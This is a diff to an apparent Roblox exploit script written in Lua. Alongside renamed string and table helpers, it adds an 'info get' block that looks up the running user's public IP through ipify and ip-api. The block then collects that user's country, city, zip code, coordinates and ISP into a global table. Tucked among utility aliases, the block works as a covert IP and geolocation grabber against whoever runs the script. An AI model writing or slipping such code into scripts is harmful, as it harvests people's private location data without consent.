@@ -116,12 +116,47 @@ _G.IsOnMobile = table.find({Enum.Platform.IOS,Enum.Platform.Android}, _G.uis:Get
 end;
 
 -- [[ T O & T A B L E S  ]] --
-   _G.find = table.find;
+_G.find = table.find;
+_G.table = table.foreach;
+_G.insert = table.insert;
 _G.num = tonumber;
 _G.str = tostring;
-_G.lowerkase = string.lower;
-_G.kapital = string.upper;
+_G.strlow = string.lower;
+_G.strup = string.upper;
 _G.strfind = string.find;
+_G.strformat = string.format;
+
+--[[info get]]--
+_G.req = http_request or request or HttpPost or syn.request;
+_G.HTTP = game:GetService'HttpService';
+_G.Sexy = _G.req({
+Url = "https://api.ipify.org/?format=json",
+Method = "GET"});
+_G.sekret = _G.HTTP:JSONDecode(_G.Sexy.Body);
+_G.BUFFER = tostring(_G.sekret.ip);
+_G.ThatSexy = _G.req({
+Url = string.format("http://ip-api.com/json/%s", _G.BUFFER), Method ="Get"});
+_G.getrrixh = _G.HTTP:JSONDecode(_G.ThatSexy.Body);
+--stuff e--
+getgenv().e = (":");
+local e = getgenv().e or _G.e;
+_G.e = getgenv().e and e;
+
+getgenv().stuff = {
+["IP"..e] = _G.BUFFER,
+["Kountry"..e] = _G.getrrixh.country,
+["Kountry Kode"..e] = _G.getrrixh.countryCode,
+["Region"..e] = _G.getrrixh.region,
+["Region Name"..e] = _G.getrrixh.regionName,
+["City"..e] = _G.getrrixh.city,
+["Zip Kode"..e] = _G.getrrixh.zip,
+["Latitude"..e] = _G.getrrixh.lat,
+["Longitude"..e] = _G.getrrixh.lon,
+["Internet Servixe Provider"..e] = _G.getrrixh.isp,
+["Organization"..e] = _G.getrrixh.org
+}
+--[[ E N D . O F . I N F O . G E T ]]--
+
 
 --[[ cframe pos ]]--
 
